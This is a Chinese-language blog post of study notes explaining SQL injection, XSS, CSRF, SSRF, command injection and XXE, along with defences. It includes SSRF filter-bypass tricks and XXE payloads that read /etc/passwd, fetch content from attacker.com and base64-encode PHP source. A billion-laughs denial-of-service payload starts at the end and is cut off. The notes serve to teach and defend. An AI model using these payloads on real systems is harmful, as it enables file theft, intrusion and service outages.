<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="一.  SQL注入漏洞就是把用户可控的一些变量，带入到了数据库的各种操作当中，并且没有做好过滤。数字型注入：变量没有被单引号封住，不需要用单引号区分数据和sql命令，会让GPC机制无用，防范方法：强制类型转换 字符型sql注入：有单引号封住，闭合需要单引号。这个全局没有做addslashes ，查询时对一些用户可控变量进行addslashes ()，那么可以找没有被addsashes()的变量。">
<meta property="og:type" content="article">
<meta property="og:title" content="web常见通用漏洞原理总结">
<meta property="og:url" content="http://yoursite.com/2017/11/13/web常见通用漏洞原理总结/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="一.  SQL注入漏洞就是把用户可控的一些变量，带入到了数据库的各种操作当中，并且没有做好过滤。数字型注入：变量没有被单引号封住，不需要用单引号区分数据和sql命令，会让GPC机制无用，防范方法：强制类型转换 字符型sql注入：有单引号封住，闭合需要单引号。这个全局没有做addslashes ，查询时对一些用户可控变量进行addslashes ()，那么可以找没有被addsashes()的变量。">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/2017/11/13/web常见通用漏洞原理总结/image1.png">
<meta property="og:image" content="http://yoursite.com/2017/11/13/web常见通用漏洞原理总结/image2.png">
<meta property="og:image" content="http://yoursite.com/2017/11/13/web常见通用漏洞原理总结/image3.png">
<meta property="og:image" content="http://yoursite.com/2017/11/13/web常见通用漏洞原理总结/image4.png">
<meta property="og:image" content="http://yoursite.com/2017/11/13/web常见通用漏洞原理总结/image5.png">
<meta property="og:updated_time" content="2017-12-25T14:57:24.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="web常见通用漏洞原理总结">
<meta name="twitter:description" content="一.  SQL注入漏洞就是把用户可控的一些变量，带入到了数据库的各种操作当中，并且没有做好过滤。数字型注入：变量没有被单引号封住，不需要用单引号区分数据和sql命令，会让GPC机制无用，防范方法：强制类型转换 字符型sql注入：有单引号封住，闭合需要单引号。这个全局没有做addslashes ，查询时对一些用户可控变量进行addslashes ()，那么可以找没有被addsashes()的变量。">
<meta name="twitter:image" content="http://yoursite.com/2017/11/13/web常见通用漏洞原理总结/image1.png">






  <link rel="canonical" href="http://yoursite.com/2017/11/13/web常见通用漏洞原理总结/"/>



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>web常见通用漏洞原理总结 | Hexo</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/13/web常见通用漏洞原理总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">web常见通用漏洞原理总结
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Post created: 2017-11-13 20:49:26" itemprop="dateCreated datePublished" datetime="2017-11-13T20:49:26+08:00">2017-11-13</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Updated at: 2017-12-25 22:57:24" itemprop="dateModified" datetime="2017-12-25T22:57:24+08:00">2017-12-25</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="一-SQL注入漏洞"><a href="#一-SQL注入漏洞" class="headerlink" title="一.  SQL注入漏洞"></a>一.  SQL注入漏洞</h2><p>就是把用户可控的一些变量，带入到了数据库的各种操作当中，并且没有做好过滤。<br>数字型注入：变量没有被单引号封住，不需要用单引号区分数据和sql命令，会让GPC机制无用，<br>防范方法：强制类型转换</p>
<p>字符型sql注入：有单引号封住，闭合需要单引号。这个<br>全局没有做addslashes ，查询时对一些用户可控变量进行addslashes ()，那么可以找没有被addsashes()的变量。</p>
<p>GPC：开启magic_quote_gpc=on之后，能实现addslshes()和stripslashes()这两个函数的功能，就是在’ “ \ 前面加转义字符。Php4.0到php5.4版本默认开启。</p>
<p>宽字节注入：用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节</p>
<h3 id="MYSQL的字符集转换过程"><a href="#MYSQL的字符集转换过程" class="headerlink" title="MYSQL的字符集转换过程"></a>MYSQL的字符集转换过程</h3><ol>
<li>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</li>
<li>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：<br> • 使用每个数据字段的CHARACTER SET设定值；<br> • 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；<br> • 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；<br> • 若上述值不存在，则使用character_set_server设定值。<br>总的来说，就是将操作结果从内部操作字符集转换为character_set_results。</li>
</ol>
<p>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。<br>怎么吃的GBK编码在的%df会自动拼接%5c，因此吃掉\,而后面的ascii字符就保留了下来。<br>其它的宽字符集也是一样的分析过程，要吃掉%5c，只需要低位中包含正常的0x5c就行了。<br>防范。就是GBK编码的地位包含了%5c，所以会自动连接%5c。吃掉它。</p>
<p>那么宽字节注入是由于转编码而形成的，那具有转编码功能的函数也成了漏洞的成因。<br>mb_convert_encoding()<br>iconv()</p>
<h3 id="二次注入漏洞"><a href="#二次注入漏洞" class="headerlink" title="二次注入漏洞"></a>二次注入漏洞</h3><ol>
<li>攻击者在http请求中提交恶意输入；</li>
<li>恶意输入保存在数据库中；</li>
<li>攻击者提交第二次http请求；</li>
<li>为处理第二次http请求，程序在检索存储在数据库中的恶意输入，构造SQL语句；</li>
<li><p>如果攻击成功，在第二次请求响应中返回结果。</p>
<p>就是第一步注入的数据保存在数据库中，被用来带入第二次查询的语句中，造成了sql注入漏洞。<br>一阶SQL注入和二阶SQL注入危害一致，攻击者获得数据库的访问权限，窃取相关数据，但是一阶SQL注入可以通过相关工具扫描出来，<br>而二阶SQL注入更微妙，通常二阶SQL注入漏洞的测试主要依据测试人员对系统功能的理解和对常出错位置经验的判断，但是应用功能的增加，经验的测试结果并不能保证测试结果。</p>
</li>
</ol>
<p>二阶SQL注入原理讲解<br>　　假设一个网站数据库中存在一个用户名为：“admin”，密码为：“123456”。攻击者注册用户名为：“admin’– ”，密码为：“123”；程序中的代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String name=StringEscapeUtiles.escapeSql(request.getParameter(&quot;Name&quot;));</span><br><span class="line">String pwd=StringEscapeUtiles.escapeSql(request.getParameter(&quot;pwd&quot;));</span><br><span class="line">String sql1=&quot;insert into user(username,password) values (&quot;name&quot;,&quot;pwd&quot;)&quot;;</span><br></pre></td></tr></table></figure></p>
<p>　　程序在把输入数据存入数据库之前，对输入的数据中的单引号进行了转义来防止恶意输入对对数据库中数据带来的影响，避免了一阶注入带来的问题，但是在数据库中存入的用户名任然为：“admin’– ”。现在攻击者要更新密码，程序会首先判断用户是否存在，代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String name=StringEscapeUtiles.escapeSql(request.getParameter(&quot;Name&quot;));</span><br><span class="line">String oldpwd=StringEscapeUtiles.escapeSql(request.getParameter(&quot;oldpwd&quot;));</span><br><span class="line">String newpwd=StringEscapeUtiles.escapeSql(request.getParameter(&quot;newpwd&quot;));　　</span><br><span class="line">String sql2 = &quot;select * from user where username=&quot;name&quot; and password=&quot;oldpwd&quot;&quot;;</span><br></pre></td></tr></table></figure></p>
<p>　　确认用户存在且密码正确时，应用程序执行更新密码语句：<br><code>sql3=&quot;update user set password=&quot;newpwd&quot; where username=&quot;username&quot;&quot;;</code><br>　　在数据库中执行语句为：<br><code>update user set password =“111111” where username=&#39;admin&#39;-- &#39;</code><br>　　在数据库语句这种“– ”表示注释，因此“– ”后面的语句不会执行；最终攻击者改变的不是“admin’– ”的密码，而是admin的密码，从而实现攻击。</p>
<p>Server 注入：只对 GET POST COOKIE进行addslashes，没有对server进行转义。那么SERVER变量就可以被注入了。<br>QUERY_STRING，X_FORWARDED_FOR，CLIENT_IP，CLIENT_IP，HTTP_HOST</p>
<h2 id="二-XSS脚本攻击"><a href="#二-XSS脚本攻击" class="headerlink" title="二.  XSS脚本攻击"></a>二.  XSS脚本攻击</h2><p>XSS（cross-site scripting跨域脚本攻击）攻击是最常见的Web攻击，其重点是“跨域”和“客户端执行”</p>
<h3 id="Reflected-XSS（反射型XSS）"><a href="#Reflected-XSS（反射型XSS）" class="headerlink" title="Reflected XSS（反射型XSS）"></a>Reflected XSS（反射型XSS）</h3><p>基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。<br>安全防范：</p>
<ol>
<li>前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。</li>
<li>后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。</li>
</ol>
<h3 id="Stored-XSS（存储型XSS）"><a href="#Stored-XSS（存储型XSS）" class="headerlink" title="Stored XSS（存储型XSS）"></a>Stored XSS（存储型XSS）</h3><p>通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。<br>开发安全措施：</p>
<ol>
<li>首要是服务端要进行过滤，因为前端的校验可以被绕过。</li>
<li>当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。</li>
</ol>
<h3 id="DOM-based-or-local-XSS"><a href="#DOM-based-or-local-XSS" class="headerlink" title="DOM-based or local XSS"></a>DOM-based or local XSS</h3><p>未总结</p>
<h2 id="三-CSRF跨站点请求伪造-Cross—Site-Request-Forgery"><a href="#三-CSRF跨站点请求伪造-Cross—Site-Request-Forgery" class="headerlink" title="三.  CSRF跨站点请求伪造(Cross—Site Request Forgery)"></a>三.  CSRF跨站点请求伪造(Cross—Site Request Forgery)</h2><p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
<ol>
<li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</li>
<li>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</li>
<li>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</li>
<li>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</li>
<li>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</li>
</ol>
<p>最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
<h3 id="防御CSRF攻击："><a href="#防御CSRF攻击：" class="headerlink" title="防御CSRF攻击："></a>防御CSRF攻击：</h3><p>目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p>
<h4 id="（1）验证-HTTP-Referer-字段"><a href="#（1）验证-HTTP-Referer-字段" class="headerlink" title="（1）验证 HTTP Referer 字段"></a>（1）验证 HTTP Referer 字段</h4><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。<br>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。<br>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。<br>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
<h4 id="（2）在请求地址中添加-token-并验证"><a href="#（2）在请求地址中添加-token-并验证" class="headerlink" title="（2）在请求地址中添加 token 并验证"></a>（2）在请求地址中添加 token 并验证</h4><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。<br>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a href="http://url?csrftoken=tokenvalue。" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上 <input type="”hidden”" name="”csrftoken”" value="”tokenvalue”/">，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。<br>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
<h4 id="（3）在-HTTP-头中自定义属性并验证"><a href="#（3）在-HTTP-头中自定义属性并验证" class="headerlink" title="（3）在 HTTP 头中自定义属性并验证"></a>（3）在 HTTP 头中自定义属性并验证</h4><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。<br>然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
<h2 id="四-SSRF服务器端请求伪造"><a href="#四-SSRF服务器端请求伪造" class="headerlink" title="四.  SSRF服务器端请求伪造"></a>四.  SSRF服务器端请求伪造</h2><p>Ssrf是攻击者构造形成由服务端发起请求的一个安全漏洞。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。<br>比较容易出问题的点：</p>
<ol>
<li>分享：通过URL地址分享网页内容</li>
<li>转码服务</li>
<li>在线翻译</li>
<li>图片加载与下载：通过URL地址加载或下载图片</li>
<li>图片、文章收藏功能</li>
<li>未公开的api实现以及其他调用URL的功能</li>
<li>从URL关键字中寻找</li>
</ol>
<p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞<br>在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p>
<h3 id="防范："><a href="#防范：" class="headerlink" title="防范："></a>防范：</h3><p>通过对这些服务器可访问的资源访问做限制，并且过滤用户的输入。</p>
<h3 id="过滤的绕过"><a href="#过滤的绕过" class="headerlink" title="过滤的绕过"></a>过滤的绕过</h3><p>Ip地址转换成进制<br><a href="http://www.baidu.com@192.168.0.1/" target="_blank" rel="noopener">http://www.baidu.com@192.168.0.1/</a></p>
<p>在网络上存在一个很神奇的服务，<a href="http://xip.io" target="_blank" rel="noopener">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。<br>由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。</p>
<p>GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的<br>File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。</p>
<h2 id="五-命令执行漏洞："><a href="#五-命令执行漏洞：" class="headerlink" title="五.  命令执行漏洞："></a>五.  命令执行漏洞：</h2><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。<br>PHP可调用外部程序的常见函数：system,exec,shell_exec,passthru,popen,proc_popen<br>成因分类：<br>1.代码层过滤不严格：<br>商业应用需要执行命令，商业应用的一些核心代码可能封住在二进制文件当中，在web应用中通过system函数调用。<br>system(“/bin/program –arg $arg”)<br>2.调用第三方组件存在的代码执行漏洞：<br>如wordpress，可以选择imagemagick这个常用的图片处理组件，处理用户上传图片时造成命令执行<br>JAVA中 struts2/elasticsearch groovy等<br>3系统自身的漏洞–&gt;bash破壳漏洞（CVE-2014-6271）</p>
<p>渗透中使最可靠的方法使用时间延迟推断，类似与盲注的方法。<br>windows支持：&amp;&amp;,&amp;,||（哪条名令为真执行那条）<br>linux支持：&amp;&amp;,&amp;,||（执行为真） | （执行后面的语句）</p>
<p>修复方案：<br>尽量使用脚本解决工作，少用执行命令函数，php中禁止disable_functions<br>程序参数的情况，escapshellcmd过滤<br>程序参数值的情况，escapeshellarg过滤<br>参数值尽量使用引用号包裹，并在拼接前调用addslashes进行转义</p>
<h2 id="六-XXE-XML-外部实体注入"><a href="#六-XXE-XML-外部实体注入" class="headerlink" title="六.  XXE XML 外部实体注入"></a>六.  XXE XML 外部实体注入</h2><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。<br>实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题.<br>XML中entity的定义语法为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE filename</span><br><span class="line">[</span><br><span class="line">&lt;!ENTITY entity-name &quot;entity-content&quot;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
<p>如果要引用一个外部资源,可以借助各种协议 几个例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///path/to/file.ext</span><br><span class="line">http://url/file.ext</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br></pre></td></tr></table></figure></p>
<p>一个简单的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure></p>
<p>亦可读取网站内容:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://attacker.com/text.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure></p>
<p>如果包含文件失败,可能是由于读取php等文件时文件本身包含的&lt;等字符.可以使用Base64编码绕过,如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure></p>
<p>攻击<br>借助XXE,有几种可用且公开的攻击方式:</p>
<p>拒绝服务<br>POC</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 